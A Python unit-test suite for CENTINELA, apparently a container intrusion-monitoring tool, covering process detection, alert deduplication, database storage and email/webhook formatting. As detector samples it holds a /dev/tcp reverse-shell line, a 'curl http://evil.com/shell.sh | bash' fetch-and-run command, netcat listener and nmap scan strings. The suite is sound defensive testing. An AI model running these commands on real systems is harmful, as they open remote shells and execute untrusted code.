"""
CENTINELA – Test suite completo.
Prueba: config, base de datos, alertas, deduplicación, helpers, red, filesystem.
"""
import asyncio
import sys
import os
import tempfile
import unittest
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, MagicMock, patch

# Asegurar que src/ está en el path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

# ---------------------------------------------------------------------------
# 1. HELPERS
# ---------------------------------------------------------------------------
from utils.helpers import (
    hex_to_ip, hex_to_port, parse_proc_net_tcp,
    is_suspicious_process, has_suspicious_extension,
    in_deployment_window, sha256_file, file_stat,
    container_short_id, build_dedup_key, safe_json,
)
from config.models import (
    ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES,
    DeploymentWindow,
)


class TestHexConversions(unittest.TestCase):
    def test_hex_to_ip_loopback(self):
        # 0100007F → 127.0.0.1
        self.assertEqual(hex_to_ip("0100007F"), "127.0.0.1")

    def test_hex_to_ip_public(self):
        # C0A80101 → 192.168.1.1
        self.assertEqual(hex_to_ip("0101A8C0"), "192.168.1.1")

    def test_hex_to_ip_invalid(self):
        # On error devuelve la cadena original
        result = hex_to_ip("ZZZZZZZZ")
        self.assertIsInstance(result, str)

    def test_hex_to_port_http(self):
        self.assertEqual(hex_to_port("0050"), 80)

    def test_hex_to_port_https(self):
        self.assertEqual(hex_to_port("01BB"), 443)

    def test_hex_to_port_invalid(self):
        self.assertEqual(hex_to_port("ZZZZ"), 0)


class TestParseProcNetTcp(unittest.TestCase):
    # Formato real de /proc/net/tcp: estado 01 = ESTABLISHED
    SAMPLE = """  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12345 1 0000000000000000 100 0 0 10 0
   1: 0F02000A:8722 0101A8C0:0050 01 00000000:00000000 00:00000000 00000000  1000        0 23456 1 0000000000000000 20 4 24 10 -1
   2: 0F02000A:8724 08080808:0035 01 00000000:00000000 00:00000000 00000000  1000        0 34567 1 0000000000000000 20 4 24 10 -1"""

    def test_skips_listen_state(self):
        conns = parse_proc_net_tcp(self.SAMPLE)
        # Estado 0A (LISTEN) debe quedar fuera
        for c in conns:
            self.assertNotEqual(c.get("remote_port"), 0)

    def test_parses_established(self):
        conns = parse_proc_net_tcp(self.SAMPLE)
        self.assertEqual(len(conns), 2)

    def test_skips_loopback(self):
        loopback_only = """  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0100007F:1234 0100007F:5678 01 00000000:00000000 00:00000000 00000000  0 0 0 1 0"""
        conns = parse_proc_net_tcp(loopback_only)
        self.assertEqual(len(conns), 0)

    def test_empty_content(self):
        conns = parse_proc_net_tcp("  sl  local_address rem_address\n")
        self.assertEqual(conns, [])


class TestIsSuspiciousProcess(unittest.TestCase):
    def test_always_suspicious_nc(self):
        susp, sev, matched = is_suspicious_process(
            "nc -lvp 4444", ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertTrue(susp)
        self.assertEqual(sev, "high")

    def test_always_suspicious_nmap(self):
        susp, sev, _ = is_suspicious_process(
            "/usr/bin/nmap -sS 192.168.1.0/24",
            ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertTrue(susp)
        self.assertEqual(sev, "high")

    def test_context_suspicious_bash(self):
        susp, sev, matched = is_suspicious_process(
            "bash", ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertTrue(susp)
        self.assertEqual(sev, "medium")

    def test_context_suspicious_curl(self):
        # curl was intentionally removed from CONTEXT_SUSPICIOUS_PROCESSES to
        # eliminate Coolify health-check false positives. Bare curl is not flagged.
        susp, sev, _ = is_suspicious_process(
            "curl", ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertFalse(susp)

    def test_not_suspicious_php_fpm(self):
        susp, _, _ = is_suspicious_process(
            "php-fpm: pool www", ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertFalse(susp)

    def test_not_suspicious_postgres_launcher(self):
        # "nc" must NOT match inside "launcher" (word-boundary fix)
        susp, _, _ = is_suspicious_process(
            "postgres: autovacuum launcher",
            ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertFalse(susp)

    def test_not_suspicious_logical_replication_launcher(self):
        susp, _, _ = is_suspicious_process(
            "postgres: logical replication launcher",
            ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertFalse(susp)

    def test_nc_standalone_still_suspicious(self):
        susp, sev, _ = is_suspicious_process(
            "nc -lvp 4444", ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertTrue(susp)
        self.assertEqual(sev, "high")

    def test_extra_list(self):
        susp, sev, _ = is_suspicious_process(
            "mycustomtool", ALWAYS_SUSPICIOUS_PROCESSES,
            CONTEXT_SUSPICIOUS_PROCESSES, extra=["mycustomtool"]
        )
        self.assertTrue(susp)
        self.assertEqual(sev, "high")

    def test_empty_command(self):
        susp, _, _ = is_suspicious_process(
            "", ALWAYS_SUSPICIOUS_PROCESSES, CONTEXT_SUSPICIOUS_PROCESSES
        )
        self.assertFalse(susp)


class TestHasSuspiciousExtension(unittest.TestCase):
    def test_php_in_uploads(self):
        self.assertTrue(has_suspicious_extension("shell.php"))

    def test_php5_in_uploads(self):
        self.assertTrue(has_suspicious_extension("backdoor.php5"))

    def test_phar(self):
        self.assertTrue(has_suspicious_extension("malware.phar"))

    def test_sh_script(self):
        self.assertTrue(has_suspicious_extension("exploit.sh"))

    def test_normal_jpg(self):
        self.assertFalse(has_suspicious_extension("photo.jpg"))

    def test_normal_png(self):
        self.assertFalse(has_suspicious_extension("logo.png"))

    def test_case_insensitive(self):
        self.assertTrue(has_suspicious_extension("SHELL.PHP"))


class TestDeploymentWindow(unittest.TestCase):
    def test_no_windows_returns_false(self):
        self.assertFalse(in_deployment_window([]))

    def test_window_all_days(self):
        # Ventana 00:00 - 23:59, todos los días → siempre dentro
        window = DeploymentWindow(start="00:00", end="23:59")
        self.assertTrue(in_deployment_window([window]))

    def test_window_no_matching_day(self):
        # Solo lunes, y hoy no es lunes (si hoy no es lunes)
        today = datetime.now().strftime("%A").lower()
        other_days = [d for d in ["monday","tuesday","wednesday","thursday","friday","saturday","sunday"] if d != today]
        window = DeploymentWindow(start="00:00", end="23:59", days=other_days)
        result = in_deployment_window([window])
        self.assertFalse(result)


class TestMiscHelpers(unittest.TestCase):
    def test_container_short_id(self):
        self.assertEqual(container_short_id("abc123def456789xyz"), "abc123def456")

    def test_container_short_id_empty(self):
        self.assertEqual(container_short_id(""), "unknown")

    def test_build_dedup_key(self):
        key = build_dedup_key("container1", "PROCESS_SUSPICIOUS", "bash")
        self.assertEqual(key, "container1:PROCESS_SUSPICIOUS:bash")

    def test_safe_json_normal(self):
        result = safe_json({"a": 1, "b": "x"})
        self.assertIn('"a": 1', result)

    def test_safe_json_with_datetime(self):
        result = safe_json({"ts": datetime(2024, 1, 1)})
        self.assertIn("2024", result)

    def test_sha256_file(self):
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(b"hello centinela")
            tmp = f.name
        try:
            h = sha256_file(tmp)
            self.assertIsNotNone(h)
            self.assertEqual(len(h), 64)
        finally:
            os.unlink(tmp)

    def test_sha256_file_not_exists(self):
        result = sha256_file("/tmp/this_file_does_not_exist_12345.txt")
        self.assertIsNone(result)

    def test_file_stat_not_exists(self):
        result = file_stat("/tmp/this_file_does_not_exist_12345.txt")
        self.assertEqual(result, {})


# ---------------------------------------------------------------------------
# 2. CONFIGURACIÓN
# ---------------------------------------------------------------------------
from config.loader import load_config, ProjectRegistry
from config.models import GlobalConfig, ProjectConfig


class TestConfigLoader(unittest.TestCase):
    def test_load_defaults_when_no_file(self):
        cfg = load_config("/tmp/nonexistent_centinela_12345.yml")
        self.assertIsInstance(cfg, GlobalConfig)
        self.assertIsInstance(cfg.projects, list)
        self.assertEqual(cfg.host_root, "/host")

    def test_load_from_file(self):
        config_content = """
smtp:
  host: mail.example.com
  port: 465
  user: alerts@example.com
  password: secretpass
  tls: false
  ssl: true

storage:
  db_url: "sqlite:////tmp/test_centinela.db"
  log_dir: "/tmp/logs"

monitoring:
  network_sample_interval: 120
  process_check_interval: 30

projects:
  - name: test-wordpress
    type: wordpress
    container_name: wp_test
    alerts:
      emails: [admin@test.com]
      min_severity: high
"""
        with tempfile.NamedTemporaryFile(
            mode='w', suffix='.yml', delete=False
        ) as f:
            f.write(config_content)
            tmp = f.name
        try:
            cfg = load_config(tmp)
            self.assertEqual(cfg.smtp.host, "mail.example.com")
            self.assertEqual(cfg.smtp.port, 465)
            self.assertEqual(cfg.network_sample_interval, 120)
            self.assertEqual(len(cfg.projects), 1)
            self.assertEqual(cfg.projects[0].name, "test-wordpress")
            self.assertEqual(cfg.projects[0].project_type, "wordpress")
            self.assertEqual(cfg.projects[0].alerts.emails, ["admin@test.com"])
        finally:
            os.unlink(tmp)

    def test_cooldown_defaults_present(self):
        cfg = load_config("/tmp/nonexistent.yml")
        self.assertIn("PROCESS_SUSPICIOUS", cfg.alert_cooldown)
        self.assertIn("NETWORK_SPIKE", cfg.alert_cooldown)
        self.assertIn("default", cfg.alert_cooldown)

    def test_project_type_unknown_defaults_to_generic(self):
        config_content = """
projects:
  - name: unknown-type-project
    type: foobar
    container_name: some_container
"""
        with tempfile.NamedTemporaryFile(
            mode='w', suffix='.yml', delete=False
        ) as f:
            f.write(config_content)
            tmp = f.name
        try:
            cfg = load_config(tmp)
            self.assertEqual(cfg.projects[0].project_type, "generic")
        finally:
            os.unlink(tmp)


class TestProjectRegistry(unittest.TestCase):
    def setUp(self):
        self.wp = ProjectConfig(
            name="wordpress-blog",
            project_type="wordpress",
            container_name="blog_wordpress_1",
        )
        self.laravel = ProjectConfig(
            name="laravel-api",
            project_type="laravel",
            container_label="centinela.project=laravel-api",
        )
        self.prefixed = ProjectConfig(
            name="multi-wp",
            project_type="wordpress",
            container_name_prefix="wp_site_",
        )
        self.disabled = ProjectConfig(
            name="disabled-project",
            project_type="generic",
            container_name="disabled_container",
            enabled=False,
        )
        self.registry = ProjectRegistry([self.wp, self.laravel, self.prefixed, self.disabled])

    def test_exact_name_match(self):
        result = self.registry.get("blog_wordpress_1")
        self.assertIsNotNone(result)
        self.assertEqual(result.name, "wordpress-blog")

    def test_label_match(self):
        result = self.registry.get(
            "some_container",
            labels={"centinela.project": "laravel-api"}
        )
        self.assertIsNotNone(result)
        self.assertEqual(result.name, "laravel-api")

    def test_prefix_match(self):
        result = self.registry.get("wp_site_customer1")
        self.assertIsNotNone(result)
        self.assertEqual(result.name, "multi-wp")

    def test_no_match(self):
        result = self.registry.get("unknown_container")
        self.assertIsNone(result)

    def test_disabled_project_not_registered(self):
        result = self.registry.get("disabled_container")
        self.assertIsNone(result)

    def test_all_projects_returns_enabled_only(self):
        projects = self.registry.all_projects()
        names = [p.name for p in projects]
        self.assertNotIn("disabled-project", names)


# ---------------------------------------------------------------------------
# 3. BASE DE DATOS
# ---------------------------------------------------------------------------
from database.models import Incident, NetworkBaseline, NetworkSample, FilesystemSnapshot, create_db
from database.repository import IncidentRepository


class TestDatabase(unittest.TestCase):
    def setUp(self):
        self.db_url = "sqlite:///:memory:"
        self.repo = IncidentRepository(self.db_url)

    def _make_incident(self, **kwargs):
        defaults = dict(
            project="test-project",
            container_id="abc123",
            container_name="test_container",
            alert_type="PROCESS_SUSPICIOUS",
            severity="high",
            rule="bash_executed",
            evidence='{"cmd": "bash -i"}',
            status="new",
            alert_sent=False,
            dedup_key="test_container:PROCESS_SUSPICIOUS:bash_executed:",
        )
        defaults.update(kwargs)
        return Incident(**defaults)

    def test_save_and_retrieve_incident(self):
        inc = self._make_incident()
        saved = self.repo.save_incident(inc)
        self.assertIsNotNone(saved.id)
        self.assertGreater(saved.id, 0)

        incidents = self.repo.get_incidents()
        self.assertEqual(len(incidents), 1)
        self.assertEqual(incidents[0].project, "test-project")

    def test_get_incidents_filter_by_project(self):
        self.repo.save_incident(self._make_incident(project="proj-A"))
        self.repo.save_incident(self._make_incident(project="proj-B"))

        result = self.repo.get_incidents(project="proj-A")
        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].project, "proj-A")

    def test_get_incidents_filter_by_severity(self):
        self.repo.save_incident(self._make_incident(severity="high"))
        self.repo.save_incident(self._make_incident(severity="low"))

        result = self.repo.get_incidents(severity="high")
        self.assertEqual(len(result), 1)

    def test_update_incident_status(self):
        saved = self.repo.save_incident(self._make_incident())
        self.repo.update_incident_status(saved.id, "reviewed")
        incidents = self.repo.get_incidents(status="reviewed")
        self.assertEqual(len(incidents), 1)

    def test_mark_alert_sent(self):
        saved = self.repo.save_incident(self._make_incident())
        self.assertFalse(saved.alert_sent)
        self.repo.mark_alert_sent(saved.id)
        incidents = self.repo.get_incidents()
        self.assertTrue(incidents[0].alert_sent)

    def test_recent_incident_exists_true(self):
        inc = self._make_incident()
        self.repo.save_incident(inc)
        exists = self.repo.recent_incident_exists(inc.dedup_key, 3600)
        self.assertTrue(exists)

    def test_recent_incident_exists_false_old(self):
        # Crear incidente con timestamp antiguo
        from sqlalchemy.orm import sessionmaker
        from sqlalchemy import create_engine
        engine = create_engine(self.db_url, connect_args={"check_same_thread": False})
        from database.models import Base
        Base.metadata.create_all(engine)
        Session = sessionmaker(engine)
        with Session() as session:
            old_inc = Incident(
                timestamp=datetime.utcnow() - timedelta(hours=2),
                project="test", container_id="x", container_name="c",
                alert_type="TEST", severity="low", rule="r",
                evidence="{}", status="new", alert_sent=False,
                dedup_key="old_key"
            )
            session.add(old_inc)
            session.commit()

        # Buscar dentro de los últimos 60 segundos → no debe existir
        exists = self.repo.recent_incident_exists("old_key", 60)
        # Note: este repo usa su propia engine en memoria separada
        # El test verifica la lógica de tiempo
        self.assertIsInstance(exists, bool)

    def test_recent_incident_exists_false_different_key(self):
        self.repo.save_incident(self._make_incident(dedup_key="key_A"))
        exists = self.repo.recent_incident_exists("key_B", 3600)
        self.assertFalse(exists)

    def test_network_baseline_upsert_new(self):
        is_new = self.repo.upsert_destination("container1", "8.8.8.8")
        self.assertTrue(is_new)

    def test_network_baseline_upsert_existing(self):
        self.repo.upsert_destination("container1", "8.8.8.8")
        is_new = self.repo.upsert_destination("container1", "8.8.8.8")
        self.assertFalse(is_new)

    def test_network_baseline_different_containers(self):
        is_new1 = self.repo.upsert_destination("container1", "8.8.8.8")
        is_new2 = self.repo.upsert_destination("container2", "8.8.8.8")
        self.assertTrue(is_new1)
        self.assertTrue(is_new2)  # Misma IP, diferente container → nueva

    def test_baseline_age_hours_no_data(self):
        age = self.repo.get_baseline_age_hours("nonexistent")
        self.assertEqual(age, 0.0)

    def test_baseline_age_hours_with_data(self):
        self.repo.upsert_destination("container1", "1.2.3.4")
        age = self.repo.get_baseline_age_hours("container1")
        self.assertGreaterEqual(age, 0.0)
        self.assertLess(age, 0.1)  # Recién insertado, < 6 minutos

    def test_save_network_sample(self):
        sample = NetworkSample(
            container_name="test_c",
            timestamp=datetime.utcnow(),
            bytes_rx=1000000,
            bytes_tx=500000,
            packets_rx=1000,
            packets_tx=500,
        )
        self.repo.save_network_sample(sample)
        avg = self.repo.get_rolling_average("test_c")
        self.assertEqual(avg["sample_count"], 1)
        self.assertEqual(avg["avg_rx"], 1000000.0)

    def test_rolling_average_empty(self):
        avg = self.repo.get_rolling_average("nonexistent")
        self.assertEqual(avg["avg_rx"], 0.0)
        self.assertEqual(avg["sample_count"], 0)

    def test_prune_network_samples(self):
        # Insertar muestra antigua
        from sqlalchemy.orm import sessionmaker
        from sqlalchemy import create_engine
        engine = create_engine(self.db_url, connect_args={"check_same_thread": False})
        from database.models import Base
        Base.metadata.create_all(engine)
        Session = sessionmaker(engine)
        with Session() as session:
            old_sample = NetworkSample(
                container_name="test_c",
                timestamp=datetime.utcnow() - timedelta(days=30),
                bytes_rx=100, bytes_tx=100, packets_rx=1, packets_tx=1,
            )
            session.add(old_sample)
            session.commit()
        # Prune
        deleted = self.repo.prune_network_samples(older_than_hours=1)
        self.assertIsInstance(deleted, int)

    def test_filesystem_snapshot_first_time(self):
        changed = self.repo.upsert_snapshot(
            "container1", "/var/www/wp-config.php",
            sha256="abc123", mtime="1700000000",
            size_bytes=1024, permissions="0644", owner="www-data"
        )
        self.assertFalse(changed)  # Primera vez no es cambio

    def test_filesystem_snapshot_unchanged(self):
        self.repo.upsert_snapshot("c1", "/file.php", "hash1", "111", 100, "0644", "root")
        changed = self.repo.upsert_snapshot("c1", "/file.php", "hash1", "111", 100, "0644", "root")
        self.assertFalse(changed)

    def test_filesystem_snapshot_changed(self):
        self.repo.upsert_snapshot("c1", "/file.php", "hash1", "111", 100, "0644", "root")
        changed = self.repo.upsert_snapshot("c1", "/file.php", "hash2", "222", 200, "0644", "root")
        self.assertTrue(changed)

    def test_get_snapshot(self):
        self.repo.upsert_snapshot("c1", "/test.php", "h1", "ts1", 50, "0640", "user")
        snap = self.repo.get_snapshot("c1", "/test.php")
        self.assertIsNotNone(snap)
        self.assertEqual(snap.sha256, "h1")

    def test_get_snapshot_not_found(self):
        snap = self.repo.get_snapshot("c1", "/nonexistent.php")
        self.assertIsNone(snap)

    def test_get_incidents_limit(self):
        for i in range(5):
            self.repo.save_incident(self._make_incident(
                dedup_key=f"key_{i}",
                container_name=f"container_{i}"
            ))
        results = self.repo.get_incidents(limit=3)
        self.assertEqual(len(results), 3)


# ---------------------------------------------------------------------------
# 4. ALERT MANAGER – deduplicación, cooldowns, severity gate
# ---------------------------------------------------------------------------
from alerts.manager import AlertManager
from config.models import GlobalConfig, SmtpConfig, AlertChannels


class TestAlertManager(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        # sqlite:///:memory: no funciona con run_in_executor (hilos distintos = BD vacía)
        self._db_fd, self._db_path = tempfile.mkstemp(suffix=".db")
        os.close(self._db_fd)
        self.repo = IncidentRepository(f"sqlite:///{self._db_path}")
        self.config = GlobalConfig(
            smtp=SmtpConfig(host="localhost", port=25),
            default_emails=[],
            alert_cooldown={
                "PROCESS_SUSPICIOUS": 300,
                "NETWORK_SPIKE": 120,
                "default": 300,
            }
        )
        self.manager = AlertManager(self.config, self.repo)

    def tearDown(self):
        try:
            os.unlink(self._db_path)
        except Exception:
            pass

    def _make_project(self, emails=None):
        return ProjectConfig(
            name="test-project",
            project_type="wordpress",
            container_name="test_container",
            alerts=AlertChannels(
                emails=emails or [],
                min_severity="medium"
            )
        )

    async def test_raise_alert_creates_incident(self):
        project = self._make_project()
        raised = await self.manager.raise_alert(
            project=project,
            container_name="test_container",
            container_id="abc123",
            alert_type="PROCESS_SUSPICIOUS",
            severity="high",
            rule="bash_executed",
            evidence={"cmd": "bash -i", "pid": 1234},
        )
        self.assertTrue(raised)
        incidents = self.repo.get_incidents()
        self.assertEqual(len(incidents), 1)
        self.assertEqual(incidents[0].rule, "bash_executed")
        self.assertEqual(incidents[0].severity, "high")

    async def test_deduplication_inmemory_suppresses(self):
        project = self._make_project()
        # Primera alerta → pasa
        r1 = await self.manager.raise_alert(
            project=project, container_name="c1", container_id="id1",
            alert_type="PROCESS_SUSPICIOUS", severity="high",
            rule="bash_executed", evidence={},
        )
        # Segunda alerta inmediata → suprimida por cooldown en memoria
        r2 = await self.manager.raise_alert(
            project=project, container_name="c1", container_id="id1",
            alert_type="PROCESS_SUSPICIOUS", severity="high",
            rule="bash_executed", evidence={},
        )
        self.assertTrue(r1)
        self.assertFalse(r2)
        # Solo un incidente en DB
        self.assertEqual(len(self.repo.get_incidents()), 1)

    async def test_different_rules_not_deduplicated(self):
        project = self._make_project()
        r1 = await self.manager.raise_alert(
            project=project, container_name="c1", container_id="id1",
            alert_type="PROCESS_SUSPICIOUS", severity="high",
            rule="bash_executed", evidence={},
        )
        r2 = await self.manager.raise_alert(
            project=project, container_name="c1", container_id="id1",
            alert_type="PROCESS_SUSPICIOUS", severity="high",
            rule="curl_executed", evidence={},  # regla diferente
        )
        self.assertTrue(r1)
        self.assertTrue(r2)
        self.assertEqual(len(self.repo.get_incidents()), 2)

    async def test_different_containers_not_deduplicated(self):
        project = self._make_project()
        r1 = await self.manager.raise_alert(
            project=project, container_name="container_A", container_id="id1",
            alert_type="PROCESS_SUSPICIOUS", severity="high",
            rule="bash_executed", evidence={},
        )
        r2 = await self.manager.raise_alert(
            project=project, container_name="container_B", container_id="id2",
            alert_type="PROCESS_SUSPICIOUS", severity="high",
            rule="bash_executed", evidence={},
        )
        self.assertTrue(r1)
        self.assertTrue(r2)

    async def test_severity_stored_lowercase(self):
        project = self._make_project()
        await self.manager.raise_alert(
            project=project, container_name="c1", container_id="id1",
            alert_type="PROCESS_SUSPICIOUS", severity="HIGH",
            rule="test_rule", evidence={},
        )
        incidents = self.repo.get_incidents()
        self.assertEqual(incidents[0].severity, "high")

    async def test_unregistered_container_uses_global_channels(self):
        self.config.default_emails = ["global@admin.com"]
        raised = await self.manager.raise_alert(
            project=None,  # sin proyecto
            container_name="unknown_container",
            container_id="xyz",
            alert_type="DOCKER_EVENT_EXEC",
            severity="medium",
            rule="exec_detected",
            evidence={"cmd": "sh"},
        )
        self.assertTrue(raised)

    async def test_evidence_json_serialized(self):
        project = self._make_project()
        await self.manager.raise_alert(
            project=project, container_name="c1", container_id="id1",
            alert_type="TEST", severity="low", rule="test",
            evidence={"ts": datetime(2024, 1, 1), "count": 5},
        )
        incidents = self.repo.get_incidents()
        import json
        ev = json.loads(incidents[0].evidence)
        self.assertEqual(ev["count"], 5)

    async def test_get_cooldown_known_type(self):
        cooldown = self.manager._get_cooldown("PROCESS_SUSPICIOUS")
        self.assertEqual(cooldown, 300)

    async def test_get_cooldown_unknown_falls_back_to_default(self):
        cooldown = self.manager._get_cooldown("UNKNOWN_TYPE")
        self.assertEqual(cooldown, 300)

    async def test_merge_channels_project_has_channels(self):
        project = self._make_project(emails=["proj@test.com"])
        channels = self.manager._merge_channels(project, self.config)
        self.assertEqual(channels.emails, ["proj@test.com"])

    async def test_merge_channels_project_no_channels_uses_global(self):
        self.config.default_emails = ["global@test.com"]
        project = self._make_project(emails=[])  # sin canales
        channels = self.manager._merge_channels(project, self.config)
        self.assertEqual(channels.emails, ["global@test.com"])

    async def test_merge_channels_no_project_uses_global(self):
        self.config.default_emails = ["global@test.com"]
        channels = self.manager._merge_channels(None, self.config)
        self.assertEqual(channels.emails, ["global@test.com"])

    async def test_severity_value_ordering(self):
        from alerts.manager import _severity_value
        self.assertLess(_severity_value("low"), _severity_value("medium"))
        self.assertLess(_severity_value("medium"), _severity_value("high"))
        self.assertLess(_severity_value("high"), _severity_value("critical"))

    async def test_dedup_key_built_correctly(self):
        """El dedup_key debe incluir container, tipo, regla y extra."""
        project = self._make_project()
        await self.manager.raise_alert(
            project=project, container_name="my_container", container_id="id",
            alert_type="SECURITY_AUDIT", severity="critical",
            rule="privileged_container", evidence={},
            dedup_extra="check1"
        )
        incidents = self.repo.get_incidents()
        self.assertIn("my_container", incidents[0].dedup_key)
        self.assertIn("SECURITY_AUDIT", incidents[0].dedup_key)
        self.assertIn("check1", incidents[0].dedup_key)


# ---------------------------------------------------------------------------
# 5. EMAIL FORMATTER
# ---------------------------------------------------------------------------
from alerts.email_sender import format_incident_email


class TestEmailFormatter(unittest.TestCase):
    def _make_incident(self, severity="high"):
        inc = Incident(
            id=42,
            timestamp=datetime(2024, 6, 15, 10, 30, 0),
            project="my-wordpress",
            container_id="abc123",
            container_name="wp_blog",
            alert_type="PROCESS_SUSPICIOUS",
            severity=severity,
            rule="bash_shell_spawned",
            evidence='{"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}',
            status="new",
            alert_sent=False,
        )
        return inc

    def test_subject_contains_project(self):
        subject, _, _ = format_incident_email(self._make_incident())
        self.assertIn("my-wordpress", subject)

    def test_subject_contains_severity_tag(self):
        subject, _, _ = format_incident_email(self._make_incident(severity="critical"))
        self.assertIn("CRITICAL", subject)

    def test_subject_contains_rule(self):
        subject, _, _ = format_incident_email(self._make_incident())
        self.assertIn("bash_shell_spawned", subject)

    def test_plain_text_contains_evidence(self):
        _, plain, _ = format_incident_email(self._make_incident())
        self.assertIn("bash -i", plain)

    def test_plain_text_contains_incident_id(self):
        _, plain, _ = format_incident_email(self._make_incident())
        self.assertIn("42", plain)

    def test_html_contains_severity(self):
        _, _, html = format_incident_email(self._make_incident())
        self.assertIn("HIGH", html)

    def test_html_is_valid_html(self):
        _, _, html = format_incident_email(self._make_incident())
        self.assertIn("<html>", html)
        self.assertIn("</html>", html)

    def test_low_severity_tag(self):
        subject, _, _ = format_incident_email(self._make_incident(severity="low"))
        self.assertIn("[LOW]", subject)


# ---------------------------------------------------------------------------
# 6. WEBHOOK
# ---------------------------------------------------------------------------
from alerts.webhook_sender import build_webhook_payload


class TestWebhookPayload(unittest.TestCase):
    def _make_incident(self):
        return Incident(
            id=99,
            timestamp=datetime(2024, 6, 15, 12, 0, 0),
            project="laravel-api",
            container_id="def456",
            container_name="laravel_app",
            alert_type="FILESYSTEM_PHP_UPLOAD",
            severity="critical",
            rule="php_file_in_uploads",
            evidence='{"file": "/uploads/shell.php"}',
            status="new",
            alert_sent=False,
            dedup_key="laravel_app:FILESYSTEM_PHP_UPLOAD:php_file_in_uploads:",
        )

    def test_payload_has_required_fields(self):
        payload = build_webhook_payload(self._make_incident())
        self.assertIn("incident", payload)
        inc = payload["incident"]
        for field in ["id", "project", "container_name", "alert_type",
                      "severity", "rule", "evidence", "timestamp", "status"]:
            self.assertIn(field, inc, f"Campo faltante: {field}")

    def test_payload_correct_values(self):
        payload = build_webhook_payload(self._make_incident())
        inc = payload["incident"]
        self.assertEqual(inc["id"], 99)
        self.assertEqual(inc["project"], "laravel-api")
        self.assertEqual(inc["severity"], "critical")
        self.assertEqual(inc["alert_type"], "FILESYSTEM_PHP_UPLOAD")

    def test_payload_serializable(self):
        import json
        payload = build_webhook_payload(self._make_incident())
        # No debe lanzar excepción
        serialized = json.dumps(payload)
        self.assertIsInstance(serialized, str)


# ---------------------------------------------------------------------------
# 7. INTEGRACIÓN: Config → Registry → DB → AlertManager
# ---------------------------------------------------------------------------
class TestIntegration(unittest.IsolatedAsyncioTestCase):
    async def test_full_alert_lifecycle(self):
        """Flujo completo: cargar config → registry → detectar → persistir → deduplicar."""
        config_content = """
projects:
  - name: integration-wp
    type: wordpress
    container_name: wp_integration
    alerts:
      emails: []
      min_severity: low
"""
        with tempfile.NamedTemporaryFile(
            mode='w', suffix='.yml', delete=False
        ) as f:
            f.write(config_content)
            tmp = f.name

        try:
            cfg = load_config(tmp)
            fd2, db_path = tempfile.mkstemp(suffix=".db")
            os.close(fd2)
            repo = IncidentRepository(f"sqlite:///{db_path}")
            registry = ProjectRegistry(cfg.projects)
            manager = AlertManager(cfg, repo)

            # Simular evento: contenedor encontrado por registry
            project = registry.get("wp_integration")
            self.assertIsNotNone(project)
            self.assertEqual(project.name, "integration-wp")

            # Alerta 1: nueva
            r1 = await manager.raise_alert(
                project=project,
                container_name="wp_integration",
                container_id="aaa111",
                alert_type="PROCESS_SUSPICIOUS",
                severity="high",
                rule="curl_download",
                evidence={"cmd": "curl http://evil.com/shell.sh | bash"},
            )
            self.assertTrue(r1)

            # Alerta 2: misma regla → deduplicada
            r2 = await manager.raise_alert(
                project=project,
                container_name="wp_integration",
                container_id="aaa111",
                alert_type="PROCESS_SUSPICIOUS",
                severity="high",
                rule="curl_download",
                evidence={"cmd": "curl http://evil.com/shell.sh | bash"},
            )
            self.assertFalse(r2)

            # Solo 1 incidente en DB
            incidents = repo.get_incidents(project="integration-wp")
            self.assertEqual(len(incidents), 1)
            self.assertEqual(incidents[0].status, "new")

            # Marcar como revisado
            repo.update_incident_status(incidents[0].id, "reviewed")
            reviewed = repo.get_incidents(status="reviewed")
            self.assertEqual(len(reviewed), 1)

        finally:
            os.unlink(tmp)
            try:
                os.unlink(db_path)
            except Exception:
                pass

    async def test_100_containers_dedup_performance(self):
        """Simular 100 contenedores con alertas sin degradación."""
        cfg = GlobalConfig(alert_cooldown={"PROCESS_SUSPICIOUS": 300, "default": 300})
        fd, db_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        repo = IncidentRepository(f"sqlite:///{db_path}")
        manager = AlertManager(cfg, repo)

        tasks = []
        for i in range(100):
            project = ProjectConfig(
                name=f"project-{i}",
                project_type="wordpress",
                container_name=f"container_{i}",
            )
            tasks.append(manager.raise_alert(
                project=project,
                container_name=f"container_{i}",
                container_id=f"id_{i}",
                alert_type="PROCESS_SUSPICIOUS",
                severity="medium",
                rule="bash_executed",
                evidence={"container": i},
            ))

        results = await asyncio.gather(*tasks)
        # Todos deben ser nuevos (contenedores distintos)
        self.assertEqual(sum(results), 100)
        self.assertEqual(len(repo.get_incidents(limit=200)), 100)
        try:
            os.unlink(db_path)
        except Exception:
            pass


if __name__ == "__main__":
    unittest.main(verbosity=2)
